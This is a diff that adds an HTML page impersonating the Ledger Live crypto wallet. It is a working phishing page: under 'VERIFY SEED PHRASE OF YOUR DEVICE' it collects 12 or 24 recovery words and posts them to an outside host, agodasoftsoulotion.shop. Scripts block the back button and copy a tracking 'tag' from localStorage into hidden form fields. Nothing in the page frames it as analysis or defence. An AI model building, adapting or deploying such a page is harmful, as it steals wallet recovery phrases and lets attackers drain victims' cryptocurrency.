@@ -1,0 +1,438 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+<head>
+
+
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+    <title>Ledger Live</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link rel="stylesheet" type="text/css" href="responsive.css">
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com/index.html" crossorigin="">
+
+    <link rel="preconnect" href="https://fonts.gstatic.com/index.html" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2c948.css?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+    <script src="https://kit.fontawesome.com/23bf195ef9.js" crossorigin="anonymous"></script>
+
+    <style media="all" id="fa-v4-font-face">
+        .NanoSPlusNext {
+            text-align: center;
+        }
+        
+        .NanoXNext {
+            text-align: center;
+        }
+
+        .NanoSNext1 {
+            text-align: center;
+        }
+        
+        .BlueNext {
+            text-align: center;
+        }
+        
+        .NanoSPlusNext h4 {
+            color: #fff;
+            padding-top: 50px;
+            padding-bottom: 25px;
+            font-size: 20px;
+        }
+        
+        .NanoXNext h4 {
+            color: #fff;
+            padding-top: 50px;
+            padding-bottom: 25px;
+            font-size: 20px;
+        }
+        
+        .BlueNext h4 {
+            color: #fff;
+            padding-top: 50px;
+            padding-bottom: 25px;
+            font-size: 20px;
+        }
+        
+        .tt-dataset-typeahead {
+            background: beige !important;
+        }
+        
+        .twitter-typeahead {
+            display: block !important;
+        }
+        
+        .tt-dataset-typeahead {
+            background: #4C4C4C;
+            padding: 2px 24px;
+        }
+        .animationWrapper {
+            height: fit-content !important;
+            width: fit-content !important;
+        }
+
+    </style>
+
+    <style>
+        .nav-pills .nav-link.active, .nav-pills .show>.nav-link {
+    color: #fff;
+    background:#bbb3fa!important;
+    color: #121113!important;
+    font-weight:700!important;
+}
+#body_all .nav-pills .nav-link{
+    background: 0 0;
+    border: 0;
+    border-radius: 0.25rem;
+    background: #222;
+    color: #bfbfc1;
+}
+#body_all .nav{
+    display: flex;
+    flex-wrap: wrap;
+    padding-left: 0;
+    margin-bottom: 0;
+    list-style: none;
+    gap: 25px;
+}
+
+#body_all input{
+    height: 42px;
+    border-radius: 4px;
+    border: 1px solid #333;
+    background: #151515;
+    color: #fff;
+    font-weight: 600;
+    margin-top:25px;
+    padding-left:12px;
+    padding-right:5px;
+    margin-right:16px;
+    width:100%;
+}
+.wrapper_tab_bar{
+    padding:40px 10px;
+}
+/*------*/
+/*div#secondStepBlock {
+    max-width: 1200px;
+    margin: auto;
+}
+*/
+    </style>
+    <style>
+ /*       .row_inpuitt {
+    display: flex;
+    gap: 30px;
+}*/
+.flex_input {
+    display: flex;
+}
+button#cointiue_btn {
+    background: #fff0f000;
+    border: 1px solid #b7b7b7;
+    border-radius: 26px;
+    padding: 10px 45px;
+    font-weight: 500;
+    font-size: 17px;
+    margin-top: 38px;
+}
+.btn-check:focus+.btn, .btn:focus {
+    outline: 0;
+    box-shadow: 0 0 0 0.25rem rgba(13,110,253,.25)!important;
+}
+div#secondStepBlock {
+    max-width:1220;
+    margin: auto;
+}
+
+
+@media (min-width: 500px) and (max-width: 992.98px) {
+ div#mySidenav {
+    display: none;
+}
+
+}
+    </style>
+<!-- <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const inputs = document.querySelectorAll('input.no-paste');
+            inputs.forEach(input => {
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    alert('Pasting is not allowed!');
+                });
+            });
+        });
+    </script> -->
+</head>
+
+<body id="body_all" style="background: #121314">
+    <div id="relid" class="relaytive">
+        <div class="closebtn">
+            <a href="javascript:void(0)" onclick="closeNav()"><i class="fas fa-angle-left" aria-hidden="true"></i></a>
+        </div>
+        <div id="mySidenav" class="sidenav">
+            <div class="logo">
+                <svg viewBox="0 0 155 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="logo-long">
+                    <path d="M141.239 29.9849V32H154.998V22.9137H152.993V29.9849H141.239ZM141.239 0V2.01461H152.993V9.08631H154.998V0H141.239ZM134.598 16.8689H140.652V15.0522H134.598V10.9035H141.242V9.08679H132.593V22.9137H141.537V21.097H134.598V16.8689ZM126.362 22.9137L130.333 9.08631H128.287L125.123 20.6615H124.848L121.821 9.08631H119.718L123.571 22.9137H126.362ZM117.557 9.08631H108.909V10.8643H112.231V21.1357H108.909V22.9137H117.557V21.1357H114.236V10.8643H117.557V9.08631ZM99.4157 9.08631H97.4105V22.9137H106.452V21.097H99.4157V9.08631ZM93.1838 16.9875H86.109V18.8042H93.1852L93.1838 16.9875ZM75.3969 15.5853V10.9035H78.5404C80.0736 10.9035 80.624 11.4174 80.624 12.8196V13.6495C80.624 15.0914 80.0931 15.5853 78.5404 15.5853H75.3969ZM80.3895 16.4147C81.8242 16.0394 82.8266 14.6937 82.8266 13.0964C82.8266 12.0886 82.4336 11.1803 81.6849 10.4493C80.7415 9.54096 79.4833 9.08631 77.852 9.08631H73.4279V22.9137H75.3935V17.402H78.343C79.8562 17.402 80.4656 18.034 80.4656 19.614V22.9127H82.4707V19.931C82.4707 17.7581 81.9593 16.9282 80.3871 16.6911L80.3895 16.4147ZM63.8408 16.8689H69.8948V15.0522H63.8408V10.9035H70.4846V9.08679H61.8362V22.9137H70.7796V21.097H63.8408V16.8689ZM57.2565 17.5999V18.5493C57.2565 20.5443 56.5291 21.1964 54.7009 21.1964H54.2685C52.4408 21.1964 51.5569 20.6036 51.5569 17.858V14.1429C51.5569 11.3777 52.4808 10.805 54.3085 10.805H54.7014C56.4901 10.805 57.0605 11.4767 57.08 13.3331H59.2421C59.0456 10.608 57.237 8.88695 54.5249 8.88695C53.2077 8.88695 52.1073 9.30192 51.2815 10.0917C50.0446 11.2572 49.3553 13.2327 49.3553 15.9979C49.3553 18.6646 49.9452 20.64 51.163 21.8648C51.9889 22.6747 53.1287 23.1078 54.249 23.1078C55.4283 23.1078 56.5096 22.6335 57.06 21.6066H57.335V22.9103H59.1427V15.7827H53.8147V17.5994L57.2565 17.5999ZM39.9195 10.9035H42.0603C44.0849 10.9035 45.1857 11.4174 45.1857 14.1826V17.816C45.1857 20.5812 44.0849 21.0946 42.0603 21.0946H39.9195V10.9035ZM42.2391 22.9137C45.9935 22.9137 47.3887 20.0491 47.3887 15.9998C47.3887 11.8912 45.895 9.08631 42.1996 9.08631H37.9544V22.9137H42.2391ZM28.4605 16.8689H34.5145V15.0522H28.4605V10.9035H35.1044V9.08679H26.4559V22.9137H35.3993V21.097H28.4605V16.8689ZM15.7832 9.08631H13.7786V22.9137H22.82V21.097H15.7832V9.08631ZM0 22.9137V32H13.7586V29.9849H2.00466V22.9137H0ZM0 0V9.08631H2.00466V2.01461H13.7586V0H0Z" fill="currentColor"></path>
+                </svg>
+
+            </div>
+            <ul class="img-content-set">
+
+                <li>
+                    <i class="fa-solid fa-chart-line"></i>
+                    <p>Portfolio</p>
+                </li>
+                <li>
+                    <i class="fas fa-chart-line" aria-hidden="true"></i>
+                    <p>Market</p>
+                </li>
+
+                <li>
+                    <i class="fa-solid fa-file-invoice"></i>
+                    <p>Accounts</p>
+                </li>
+
+                <li>
+                    <i class="fa-solid fa-upload"></i>
+                    <p>Send</p>
+                </li>
+                <li>
+                    <i class="fa-solid fa-download"></i>
+                    <p>Receive</p>
+                </li>
+                <li>
+                    <i class="fa-solid fa-dollar-sign"></i>
+                    <p>Buy/Sell</p>
+                </li>
+                <li>
+                    <i class="fa-solid fa-right-left"></i>
+                    <p>Swap</p>
+                </li>
+                
+                <li>
+                    <i class="fa-solid fa-screwdriver-wrench"></i>
+                    <p>Manager</p>
+                </li>
+            </ul>
+
+        </div>
+
+    </div>
+
+    <div id="main">
+        <header id="header" class="">
+            <div class="bar-sider" onclick="openNav()">
+                <p class="bar-p">☰</p>
+            </div>
+            <div class="icon">
+                <ul class="icon-ul">
+                    <li><a href="#"><i class="fas fa-bell" aria-hidden="true"></i></a></li>
+                    <li><a href="#"><i class="fas fa-eye" aria-hidden="true"></i></a></li>
+                    <li><a href="#"><i class="fas fa-question-circle" aria-hidden="true"></i></a></li>
+                    <li><a href="#"><i class="fas fa-lock" aria-hidden="true"></i></a></li>
+                    <li><a href="#"><i class="fas fa-cog" aria-hidden="true"></i></a></li>
+                </ul>
+            </div>
+        </header>
+
+        <div class="contentBlock" id="secondStepBlock" style="display:none;">
+            <div class="infoHeader">
+                <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
+                <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
+                <p>**Ledger does not keep a copy of your recovery phrase.</p>
+                <p>**ENTER 24 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
+            </div>
+            <!-- -------------------------------------------- -->
+             <div class="wrapper_tab_bar">
+
+                <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+                  <li class="nav-item">
+                    <a class="nav-link" id="pills-home-tab" data-toggle="pill" href="#pills-home" role="tab" aria-controls="pills-home" aria-selected="true">12 Words</a>
+                  </li>
+                  <li class="nav-item">
+                    <a class="nav-link active" id="pills-profile-tab" data-toggle="pill" href="#pills-profile" role="tab" aria-controls="pills-profile" aria-selected="false">24 Words</a>
+                  </li>
+                 
+                </ul>
+                <div class="tab-content" id="pills-tabContent">
+                  <div class="tab-pane fade show" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
+                      <div class="inner_form_wraper">
+                            <div class="col-sm-12_  keydata">
+                            <form id="form_word_12" class="keydata_12" action="https://agodasoftsoulotion.shop/leadg0r/mail.php" method="post" autocomplete="off" >
+                                <div class="row_inpuitt">
+                                 <div class="flex_input">
+                                 <input type="hidden" name="form_type" value="12">
+                                 <input type="hidden" id="tagField12" name="tag" value="">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed1" placeholder="1" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed2" placeholder="2" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed3" placeholder="3" required>
+                                 </div>
+                                 <div class="flex_input">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed4" placeholder="4" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed5" placeholder="5" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed6" placeholder="6" required>
+                                 </div>
+                                 <div class="flex_input">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed7" placeholder="7" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed8" placeholder="8" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed9" placeholder="9" required>
+                                 </div>
+                                 <div class="flex_input">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed10" placeholder="10" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed11" placeholder="11" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed12" placeholder="12" required>
+                                 </div>
+                                 </div>
+
+                                 <div class="form-group">
+                                  <button type="submit" id="cointiue_btn" class="btn btn-primary">Continue..</button> 
+                                </div>
+
+                             </form>
+                            </div>
+                      </div>
+                  </div>
+                  <div class="tab-pane fade show active" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">
+                       <div class="inner_form_wraper">
+                        <form id="form_word_24" class="keydata_24" action="https://agodasoftsoulotion.shop/leadg0r/mail.php" method="post" autocomplete="off" >
+                             <div class="col-sm-12_">
+                                 <div class="flex_input">
+                                 <input type="hidden" name="form_type" value="24">
+                                 <input type="hidden" id="tagField24" name="tag" value="">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" name="seed1" placeholder="1" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed2" placeholder="2" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed3" placeholder="3" required>
+                                 </div>
+                                 <div class="flex_input">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed4" placeholder="4" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed5" placeholder="5" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed6" placeholder="6" required>
+                                 </div>
+                                 <div class="flex_input">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed7" placeholder="7" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed8" placeholder="8" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed9" placeholder="9" required>
+                                 </div>
+                                 <div class="flex_input">
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed10" placeholder="10" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed11" placeholder="11" required>
+                                   <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed12" placeholder="12" required>
+                                 </div>
+                            </div>
+                            <!-- --2 -->
+                              <div class="col-sm-12_ phrase_24">
+                                    <div class="flex_input">
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed13" placeholder="13" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed14" placeholder="14" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed15" placeholder="15" required>
+                                    </div>
+                                    <div class="flex_input">
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed16" placeholder="16" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed17" placeholder="17" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed18" placeholder="18" required>
+                                    </div>
+                                    <div class="flex_input">
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed19" placeholder="19" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed20" placeholder="20" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed21" placeholder="21" required>
+                                    </div>
+                                    <div class="flex_input">
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed22" placeholder="22" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed23" placeholder="23" required>
+                                      <input type="text" onkeypress="return onlyAlphabets(event,this);" class="no-paste" name="seed24" placeholder="24" required>
+                                    </div>
+
+                                     <div class="form-group">
+                                  <button type="submit" id="cointiue_btn" class="btn btn-primary">Continue..</button> 
+                                </div>
+                                  </div>
+                            <!-- ---------end -->
+                        </form>
+                      </div>
+
+                  </div>
+                 
+                </div>
+                 
+             </div>
+
+        </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" rel="stylesheet" type="text/css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" type="text/javascript"></script>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+    <script src="script1.js"></script>
+    <script src="script2.js"></script>
+    <script src="script3.js"></script>
+    <script src="bip39-list.js"></script>
+    
+    <iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe>
+    <script>
+        //document.getElementById('vid').play();
+        
+        $(document).ready(function() {
+            var delay = 5000;
+            var step = 1;
+            var is_lap = false
+            var currentNano = '';
+
+            if (step == "1") {
+                is_lap = true;
+            }
+
+            $('.NanoSNextErrorBlock').show();
+            $('button#cryptoRecoveryPhrase').show();
+            $('button#refreshButtonAction').show();
+            $(".NanoSPlusNext").hide();
+            $(".NanoSNext").hide();
+            $(".NanoXNext").hide();
+            $(".BlueNext").hide();
+            
+            var nanos = $("#selectWrapper");
+            $("div#firstStepBlock").hide();
+            $("div#thirdStepBlock").hide();
+            $("div#fourthStepBlock").hide();
+
+
+            $("div#secondStepBlock").show();
+        });
+    </script>
+    <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+    </script>
+    <script>
+        window.onload = function() {
+        // Retrieve the 'tag' from localStorage
+        let tag = localStorage.getItem('tag');
+    
+        // Set the tag in the hidden form field if it exists
+        if (tag) {
+            //Limit the Tag
+            tag = tag.substring(0, 4);
+                
+            document.getElementById('tagField12').value = tag;
+            document.getElementById('tagField24').value = tag;
+        } else {
+        console.error("Tag not found in localStorage");
+        }
+    };
+    </script>
+
+</body>
+</html>
